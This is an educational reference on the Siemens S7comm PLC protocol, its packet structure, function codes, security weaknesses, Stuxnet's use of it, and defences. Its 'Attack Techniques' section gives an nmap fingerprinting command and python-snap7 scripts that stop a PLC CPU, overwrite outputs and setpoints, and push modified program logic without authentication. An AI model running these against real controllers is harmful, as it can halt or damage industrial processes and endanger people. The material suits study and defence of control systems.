# The S7comm Protocol

## Overview

**S7comm (S7 Communication)** is a **proprietary Siemens protocol** used for communication between **Siemens SIMATIC S7 PLCs** and engineering/SCADA systems. It operates over **ISO-on-TCP (RFC 1006)** on **TCP port 102** and is the primary protocol used by:

- **STEP 7** — Siemens PLC programming software
- **TIA Portal** — Siemens' modern engineering environment
- **WinCC** — Siemens SCADA/HMI software
- **Other SCADA systems** via Siemens communication modules

S7comm is notable in the security community because it was the protocol exploited by **Stuxnet** — the world's first known cyber weapon — to reprogram Iranian nuclear facility PLCs while hiding the changes from operators.

> 💡 S7comm is to Siemens what Modbus is to generic PLCs — except it's proprietary, more feature-rich, and historically had even weaker security controls.

---

## Siemens SIMATIC S7 PLC Family

S7comm is used across the Siemens S7 PLC product line:

| PLC Family | Description | S7comm Version |
|---|---|---|
| **S7-200** | Micro PLC (small applications) | S7comm (limited) |
| **S7-300** | Mid-range modular PLC | S7comm (classic) |
| **S7-400** | High-end process PLC | S7comm (classic) |
| **S7-1200** | Compact modern PLC | S7comm + S7comm-plus |
| **S7-1500** | High-performance modern PLC | S7comm-plus (v3) |
| **WinAC** | Software PLC (PC-based) | S7comm |
| **S7-300/400 PN** | PROFINET variants | S7comm over PROFINET |

---

## Protocol Stack

S7comm sits on top of several layers:

```
┌─────────────────────────────────────┐
│           S7comm (Layer 7)          │  ← Application data, function codes
├─────────────────────────────────────┤
│        COTP (Layer 4/5)             │  ← Connection-Oriented Transport Protocol
│     (ISO 8073 / RFC 905)            │     (handles transport connections)
├─────────────────────────────────────┤
│        TPKT (Layer 4)               │  ← Transport Protocol data unit
│        (RFC 1006)                   │     (ISO-over-TCP wrapper)
├─────────────────────────────────────┤
│        TCP (Port 102)               │  ← Standard TCP
├─────────────────────────────────────┤
│        IP / Ethernet                │
└─────────────────────────────────────┘
```

### Layer Breakdown

#### TPKT (RFC 1006)
Wraps ISO transport protocol over TCP:
```
+----------+---------+-----------------+
| Version  | Reserved|     Length      |
| (1 byte) | (1 byte)| (2 bytes)       |
+----------+---------+-----------------+
| 0x03     | 0x00    | Total frame len |
+----------+---------+-----------------+
```

#### COTP (Connection-Oriented Transport Protocol)
Handles transport-layer connections:
```
+--------+----------+------------------+
| Length | PDU Type | Parameters/Data  |
| (1B)   | (1 byte) | (Variable)       |
+--------+----------+------------------+
```

**COTP PDU Types:**
| Code | Type | Purpose |
|---|---|---|
| `0xE0` | CR (Connection Request) | Initiate connection |
| `0xD0` | CC (Connection Confirm) | Accept connection |
| `0x80` | DR (Disconnect Request) | Terminate connection |
| `0xF0` | DT (Data Transfer) | Carry S7comm payload |

---

## S7comm Versions

| Version | Name | Used By | Security |
|---|---|---|---|
| **S7comm v1** | Classic S7comm | S7-300, S7-400 | No authentication |
| **S7comm-plus v2** | S7comm+ | S7-1200 (early firmware) | Weak obfuscation |
| **S7comm-plus v3** | S7comm+ | S7-1200/1500 (newer) | Challenge-response auth (partially broken) |

> ⚠️ **S7comm v1 (used by S7-300/400)** has **zero authentication** — any device on the network can read memory, write data, upload/download program logic, and stop the CPU.

---

## Connection Establishment

S7comm connections follow a **three-phase setup**:

```
Client (STEP 7/SCADA)              S7 PLC
        |                              |
        |── TCP SYN ──────────────────►|
        |◄─ TCP SYN-ACK ──────────────|
        |── TCP ACK ──────────────────►|  TCP connected
        |                              |
        |── COTP CR (Connect Req) ────►|  COTP connection
        |◄─ COTP CC (Connect Conf) ───|
        |                              |
        |── S7 Setup Comm ────────────►|  S7 negotiation
        |◄─ S7 Setup Comm Ack ─────── |  (PDU size, parallel jobs)
        |                              |
        |   (Now ready for S7 comms)   |
```

### Setup Communication Parameters
During S7 negotiation, client and server agree on:

| Parameter | Description | Typical Value |
|---|---|---|
| **Max AMQ Caller** | Max parallel outstanding requests (client) | 1–255 |
| **Max AMQ Callee** | Max parallel outstanding requests (server) | 1–255 |
| **PDU Size** | Maximum Protocol Data Unit size | 240–65535 bytes |

---

## S7comm Packet Structure

```
┌──────────────────────────────────────────────────┐
│                  S7comm Header                   │
│  Protocol ID │ ROSCTR │ RedundancyID │ PDU Ref   │
│  Param Len   │ Data Len │ Error Class │ Error Code│
├──────────────────────────────────────────────────┤
│                  Parameters                      │
│         (Function code + parameters)             │
├──────────────────────────────────────────────────┤
│                    Data                          │
│            (Read/write data payload)             │
└──────────────────────────────────────────────────┘
```

### S7comm Header Fields

| Field | Size | Description |
|---|---|---|
| **Protocol ID** | 1 byte | Always `0x32` — identifies S7comm |
| **ROSCTR** | 1 byte | Message type (Job, Ack, Ack-Data, Userdata) |
| **Redundancy ID** | 2 bytes | Always `0x0000` (reserved) |
| **PDU Reference** | 2 bytes | Request/response matching ID |
| **Parameter Length** | 2 bytes | Length of parameter section |
| **Data Length** | 2 bytes | Length of data section |
| **Error Class** | 1 byte | Error classification (in responses) |
| **Error Code** | 1 byte | Specific error code (in responses) |

### ROSCTR (Message Types)
| Value | Type | Description |
|---|---|---|
| `0x01` | **Job** | Client request (read, write, control) |
| `0x02` | **Ack** | Simple acknowledgment (no data) |
| `0x03` | **Ack-Data** | Acknowledgment with response data |
| `0x07` | **Userdata** | Extended functions (diagnostics, programming, security) |

---

## Function Codes (Parameter Codes)

S7comm uses **function codes** in the parameter section:

### Job/Ack-Data Function Codes
| Code | Name | Description |
|---|---|---|
| `0x00` | CPU Services | Generic CPU service request |
| `0xF0` | Setup Communication | Negotiate PDU size and parallel jobs |
| `0x04` | Read Variable | Read data from PLC memory areas |
| `0x05` | Write Variable | Write data to PLC memory areas |
| `0x1A` | Request Download | Begin uploading a block to PLC |
| `0x1B` | Download Block | Transfer block data to PLC |
| `0x1C` | Download Ended | Complete block download |
| `0x1D` | Start Upload | Begin downloading a block from PLC |
| `0x1E` | Upload | Transfer block data from PLC |
| `0x1F` | End Upload | Complete block upload |
| `0x28` | PLC Control | Start/Stop/Reset PLC CPU |
| `0x29` | PLC Stop | Stop PLC CPU |

### Userdata Function Codes (0x07)
The Userdata message type extends S7comm with additional functions:

| Parameter Type | Group | Function | Description |
|---|---|---|---|
| `0x01` | Programmer | Block list | List all program blocks |
| `0x01` | Programmer | Block info | Get block information |
| `0x01` | Programmer | Read diag | Read diagnostic data |
| `0x02` | Cyclic | Subscribe | Start cyclic data transfer |
| `0x02` | Cyclic | Unsubscribe | Stop cyclic data transfer |
| `0x03` | Block | List types | List block types |
| `0x04` | CPU | Read SZL | Read System Status List |
| `0x05` | Security | Request challenge | Authentication challenge |
| `0x05` | Security | Send password | Authentication response |
| `0x06` | Time | Read clock | Get PLC time |
| `0x06` | Time | Set clock | Set PLC time |
| `0x07` | Messages | Event subscribe | Subscribe to PLC events |

---

## Memory Areas

S7comm organizes PLC memory into distinct **areas** referenced in read/write operations:

| Area Code | Name | Description | Access |
|---|---|---|---|
| `0x81` | **I (Inputs)** | Process image inputs — physical input state | Read |
| `0x82` | **Q (Outputs)** | Process image outputs — physical output state | Read/Write |
| `0x83` | **M (Merkers/Flags)** | Internal bit memory/flags | Read/Write |
| `0x84` | **DB (Data Blocks)** | Data blocks — main program data storage | Read/Write |
| `0x85` | **DI (Instance DB)** | Instance data blocks (for FBs) | Read/Write |
| `0x86` | **L (Local Data)** | Temporary local stack data | Read |
| `0x87` | **V (Previous Local)** | Previous local data | Read |
| `0x1C` | **C (Counters)** | PLC counters | Read/Write |
| `0x1D` | **T (Timers)** | PLC timers | Read/Write |

### Data Types
| Type Code | Type | Size | Description |
|---|---|---|---|
| `0x01` | **BIT** | 1 bit | Single boolean (address.bit) |
| `0x02` | **BYTE** | 8 bits | Unsigned byte |
| `0x03` | **CHAR** | 8 bits | ASCII character |
| `0x04` | **WORD** | 16 bits | Unsigned 16-bit integer |
| `0x05` | **INT** | 16 bits | Signed 16-bit integer |
| `0x06` | **DWORD** | 32 bits | Unsigned 32-bit integer |
| `0x07` | **DINT** | 32 bits | Signed 32-bit integer |
| `0x08` | **REAL** | 32 bits | IEEE 754 float |
| `0x13` | **OCTET_STRING** | Variable | Byte array |

---

## Read Variable Operation

### Request (FC 0x04)
```
S7comm Header (ROSCTR=0x01 Job)
├── Function Code: 0x04 (Read Variable)
└── Items: [{
       Variable Spec: 0x12 (Any-type)
       Spec Length: 10
       Syntax ID: 0x10 (S7ANY)
       Data Type: 0x02 (BYTE)
       Count: 10          ← Read 10 bytes
       DB Number: 0x0001  ← Data Block 1
       Area: 0x84         ← DB area
       Address: 0x000000  ← Byte offset 0
    }]
```

### Response (ROSCTR=0x03 Ack-Data)
```
S7comm Header
└── Data Items: [{
       Return Code: 0xFF (Success)
       Transport Size: 0x04 (BYTE)
       Length: 10
       Data: 01 02 03 04 05 06 07 08 09 0A
    }]
```

---

## Write Variable Operation

### Request (FC 0x05)
```
S7comm Header (ROSCTR=0x01 Job)
├── Function Code: 0x05 (Write Variable)
├── Items (addressing): [{
│      Area: 0x82 (Q - Outputs)
│      Data Type: 0x01 (BIT)
│      Count: 1
│      Byte Offset: 0
│      Bit Offset: 0    ← Q0.0 (Output 0, bit 0)
│   }]
└── Data: [{
       Return Code: 0x00
       Transport Size: 0x03 (BIT)
       Length: 1
       Value: 0x01      ← Turn ON Q0.0
    }]
```

---

## PLC Control Operations (FC 0x28/0x29)

These are among the most dangerous operations — they control the **PLC CPU state**:

```
S7comm Header (ROSCTR=0x01 Job)
├── Function Code: 0x28 (PLC Control)
└── Command:
    ├── "P_PROGRAM" → Start PLC (RUN mode)
    ├── "P_STOP"    → Stop PLC (STOP mode) ← Halts all process control!
    └── "P_RESET"   → Memory reset (factory reset!)
```

Or using direct stop (FC 0x29):
```
S7comm Header (ROSCTR=0x01 Job)
└── Function Code: 0x29 (PLC Stop)
    └── Stop ID: 0x00 → Immediately stops CPU execution
```

> ⚠️ **Security Implication**: On S7-300/400, **any unauthenticated device** on the network can send FC 0x29 to immediately halt a running PLC — stopping whatever industrial process it controls.

---

## Block Upload/Download (Program Logic)

This is how STEP 7/TIA Portal transfers **program logic** to/from the PLC:

### Block Types
| Block | Description | Contains |
|---|---|---|
| **OB (Organization Block)** | Main program entry points | Startup, cyclic scan, interrupt routines |
| **FC (Function)** | Subroutines without memory | Reusable code, no static data |
| **FB (Function Block)** | Subroutines with instance DB | Reusable code with persistent state |
| **DB (Data Block)** | Data storage | Variables, arrays, structures |
| **SFC (System Function)** | Built-in Siemens functions | Standard library calls |
| **SFB (System Function Block)** | Built-in Siemens FBs | Communication, diagnostics |

### Download Process (Client → PLC)
```
1. Client → Request Download (FC 0x1A)
   "I want to upload block OB1"
   PLC → Ack

2. Client → Download Block (FC 0x1B) [repeated]
   Transfer block data in chunks
   PLC → Ack each chunk

3. Client → Download Ended (FC 0x1C)
   "Transfer complete"
   PLC → Ack, installs new block
```

### Upload Process (PLC → Client)
```
1. Client → Start Upload (FC 0x1D)
   "I want to download block DB1"
   PLC → Ack + Upload ID

2. Client → Upload (FC 0x1E) [repeated]
   Request data chunks using Upload ID
   PLC → Returns block data chunks

3. Client → End Upload (FC 0x1F)
   "Done reading"
   PLC → Ack
```

> ⚠️ **Stuxnet Relevance**: Stuxnet exploited the ability to **download modified FC blocks** to S7-315 and S7-417 PLCs while intercepting the upload process to return the **original (unmodified) code** to STEP 7 — hiding the malicious logic from operators.

---

## System Status List (SZL)

The **SZL (System-Zustandsliste / System Status List)** is a powerful diagnostic feature that returns detailed information about the PLC:

Accessed via **Userdata FC 0x04** (Read SZL):

| SZL ID | Information Returned |
|---|---|
| `0x0011` | Module identification (CPU type, firmware, serial number) |
| `0x001C` | Component ID, plant designation, location |
| `0x0031` | Diagnostic buffer entries |
| `0x0036` | Memory configuration (work memory, load memory) |
| `0x0074` | Racks and modules present |
| `0x0091` | Module status information |
| `0x00A0` | Interrupt status |
| `0x00B1` | Protection level of the PLC |
| `0x00F1` | Communication board configuration |
| `0x0131` | Communication capabilities |

### Example SZL 0x0011 Response (Module ID)
```
Order Number:  6ES7 315-2AH14-0AB0   ← CPU model
Hardware:      0x0020                 ← Hardware version
Firmware:      V3.3                   ← Firmware version
Serial Number: S C-J2RI897531337     ← Unique serial
CPU Type:      CPU 315-2 PN/DP
```

> ⚠️ **Security Implication**: This leaks full device fingerprint to any unauthenticated client — perfect for targeted exploit development.

---

## S7comm-plus (S7+) Security Features

Siemens introduced **S7comm-plus** for S7-1200 and S7-1500 to address security shortcomings:

### S7comm-plus v2 (Early S7-1200)
- Added **obfuscation** and **session tokens**
- Researchers (Klick et al., 2014) **reversed and broke** the protocol
- Found to use a simple **rolling XOR obfuscation** — not real cryptography

### S7comm-plus v3 (S7-1200 newer / S7-1500)
- Added **challenge-response authentication**
- Uses **integrity protection** on messages
- Significantly harder to reverse engineer
- Partially analyzed by researchers (Matoušek, 2017; Hutle et al.)
- Access level protection (4 levels):
  | Level | Name | Access Granted |
  |---|---|---|
  | 1 | No protection | Full access (default — no password) |
  | 2 | HMI access | HMI read/write; programming requires password |
  | 3 | Read access | Read without password; write requires password |
  | 4 | Full protection | Password required for all access |

> ⚠️ **Common misconfiguration**: Protection level left at **Level 1 (no protection)** — the factory default.

---

## Security Weaknesses

### S7comm (Classic — S7-300/400)

| Weakness | Impact |
|---|---|
| **No Authentication** | Any host can connect and perform any operation |
| **No Encryption** | All data, logic, and commands in cleartext |
| **No Authorization** | No user roles — full access to everything |
| **CPU Stop (FC 0x29)** | Unauthenticated remote PLC halt |
| **Logic Upload/Download** | Unauthenticated program modification |
| **Memory Read/Write** | Full access to all memory areas (I, Q, M, DB) |
| **SZL Leakage** | Complete device fingerprinting without credentials |
| **Replay Attacks** | No session uniqueness — captured frames replayable |
| **Firmware Update** | Some models accept unauthenticated firmware updates |
| **No Logging** | No audit trail of who read/wrote what |

### S7comm-plus (S7-1200/1500)
| Weakness | Impact |
|---|---|
| **Default: No Protection** | Level 1 protection is factory default |
| **Weak Key Derivation** | V2 obfuscation trivially reversible |
| **Session Hijacking** | Session tokens potentially capturable on flat networks |
| **Downgrade Attacks** | Some scenarios allow forcing legacy protocol use |
| **Partial Research** | V3 not fully public — security-by-obscurity concerns |

---

## Attack Techniques

### Reconnaissance
```bash
# Nmap S7 enumeration
nmap -p 102 --script s7-info <target>

# Example output:
# PORT    STATE SERVICE
# 102/tcp open  iso-tsap
# | s7-info:
# |   Module: 6ES7 315-2AH14-0AB0
# |   Basic Hardware: 6ES7 315-2AH14-0AB0
# |   Version: 3.3
# |   System Name: SIMATIC 300 Station
# |   Module Type: CPU 315-2 PN/DP
# |   Serial Number: S C-J2RI897531337
# |   Plant ID: (empty)
# |_  Copyright: Original Siemens Equipment
```

### CPU Stop Attack
```python
import snap7

client = snap7.client.Client()
client.connect('192.168.1.10', 0, 1)  # IP, rack, slot

# Read CPU state
info = client.get_cpu_info()
print(f"Module: {info.ModuleTypeName}")
print(f"Serial: {info.SerialNumber}")

# Stop the CPU (no authentication required on S7-300/400!)
client.plc_stop()
print("PLC stopped!")

# Start it again
client.plc_hot_restart()
```

### Read/Write Memory
```python
import snap7
from snap7.util import get_bool, set_bool, get_real, set_real

client = snap7.client.Client()
client.connect('192.168.1.10', 0, 1)

# Read 100 bytes from Data Block 1
data = client.db_read(1, 0, 100)

# Read a REAL value at DB1.DBD0
temperature = get_real(data, 0)
print(f"Temperature: {temperature}°C")

# Write to outputs (Q memory area)
# Read current output state
outputs = client.read_area(snap7.types.Areas.PA, 0, 0, 1)

# Set Q0.0 = True (turn on output 0)
set_bool(outputs, 0, 0, True)
client.write_area(snap7.types.Areas.PA, 0, 0, outputs)

# Write a setpoint to DB1.DBD4
set_real(data, 4, 95.0)  # Set to 95.0°C
client.db_write(1, 0, data)
```

### Upload PLC Program Logic
```python
import snap7

client = snap7.client.Client()
client.connect('192.168.1.10', 0, 1)

# Upload (read from PLC) block OB1
block_data = client.upload(snap7.types.Block.OB, 1)
with open('OB1.bin', 'wb') as f:
    f.write(block_data)
print("OB1 uploaded — contains main PLC scan cycle logic")

# Download (write to PLC) a modified block
with open('OB1_modified.bin', 'rb') as f:
    modified_block = f.read()
client.download(1, modified_block)
print("Modified logic deployed to PLC!")
```

---

## Stuxnet & S7comm — Historical Context

Stuxnet (discovered 2010) was the first known weaponized ICS malware and specifically targeted S7comm:

```
Stuxnet Attack Chain on S7comm:

1. INFECTION:
   Spread via USB → infected Windows engineering workstations
   running Siemens STEP 7 software

2. FINGERPRINTING:
   Read SZL (0x0011) → confirmed target was
   S7-315-2 or S7-417 PLC connected to
   specific Profibus frequency converters
   (Iranian centrifuge configuration)

3. LOGIC INJECTION:
   Downloaded modified FC blocks to PLC via S7comm
   Injected malicious ladder logic into OB1/OB35

4. PROCESS MANIPULATION:
   Varied centrifuge rotor speeds outside safe limits
   (1410 Hz → 2 Hz → 1064 Hz in cycles)
   Caused physical destruction of centrifuges

5. CONCEALMENT:
   Intercepted S7comm upload requests from STEP 7
   Returned original (clean) code to operators
   Replayed recorded "normal" process values to HMI
   Operators saw nothing wrong for months
```

> This attack was possible **entirely because S7comm had no authentication** — Stuxnet could freely read, modify, and hide PLC logic.

---

## Wireshark Analysis

```
# Wireshark display filters for S7comm:
s7comm                          # All S7comm traffic
s7comm.param.func == 0x04      # Read Variable requests
s7comm.param.func == 0x05      # Write Variable requests
s7comm.param.func == 0x29      # CPU Stop commands
s7comm.header.rosctr == 1      # Job requests (client→PLC)
s7comm.header.rosctr == 3      # Ack-Data responses (PLC→client)
s7comm.param.func == 0x1b      # Block download (logic transfer)
s7comm.data.mem_area == 0x84   # Data Block accesses
s7comm.data.mem_area == 0x82   # Output (Q) accesses

# Filter for S7comm-plus
s7comm-plus                     # S7comm+ traffic (1200/1500)
```

---

## Defensive Recommendations

| Control | Implementation |
|---|---|
| **Network Segmentation** | Isolate S7 PLCs on dedicated OT network segments |
| **Enable PLC Protection** | Set protection level 3 or 4 on all S7-1200/1500 |
| **Whitelist Engineering Stations** | Only permit TCP/102 from authorized STEP 7 workstations |
| **Protocol-Aware Firewall** | Filter S7comm function codes — block FC 0x29, 0x1B, 0x28 |
| **IDS/IDS Monitoring** | Deploy Snort/Suricata rules for suspicious S7comm operations |
| **Firmware Updates** | Keep PLC firmware current — Siemens regularly patches |
| **Physical Security** | Restrict physical access to PLCs and communication modules |
| **Audit Logging** | Use Siemens TIA Portal diagnostic buffer + external SIEM |
| **Disable Unused Ports** | Disable Ethernet ports on PLCs not requiring remote access |
| **Disable PUT/GET** | Disable PUT/GET communication on S7-1200/1500 if not needed |

---

## Tools for S7comm

| Tool | Purpose |
|---|---|
| **snap7** | Python/C++ library for S7comm communication |
| **python-snap7** | Python wrapper for snap7 |
| **Nmap s7-info script** | S7 device fingerprinting |
| **Wireshark** | Built-in S7comm/S7comm-plus dissectors |
| **PLCinject** | S7 PLC payload injection tool |
| **Metasploit** | S7-300/400 modules (scanner, CPU control) |
| **ISF** | Industrial exploitation framework with S7 modules |
| **STEP 7 / TIA Portal** | Siemens' own engineering software (legitimate use) |
| **S7 Password Bruteforcer** | Brute force S7-300/400 password (if set) |

---

## Summary

```
S7comm in a nutshell:
├── Developed by: Siemens (proprietary)
├── Purpose: Communication with SIMATIC S7 PLCs
├── Port: 102/TCP (ISO-on-TCP / TPKT / COTP)
├── Versions:
│   ├── S7comm v1   → S7-300/400 (no auth, no encryption)
│   ├── S7comm+ v2  → Early S7-1200 (obfuscation, broken)
│   └── S7comm+ v3  → S7-1200/1500 (challenge-response, partial)
├── Key Operations:
│   ├── Read/Write memory areas (I, Q, M, DB)
│   ├── Upload/Download program blocks (OB, FC, FB, DB)
│   ├── CPU control (Start, Stop, Reset)
│   ├── SZL read (device fingerprinting)
│   └── Cyclic data subscriptions
├── Security:
│   ├── Classic: Zero security (no auth, no encryption)
│   ├── Plus v3: Improved but still concerns remain
│   └── Famous for: Stuxnet exploitation (2010)
└── Status: Dominant in Siemens S7 environments worldwide
```
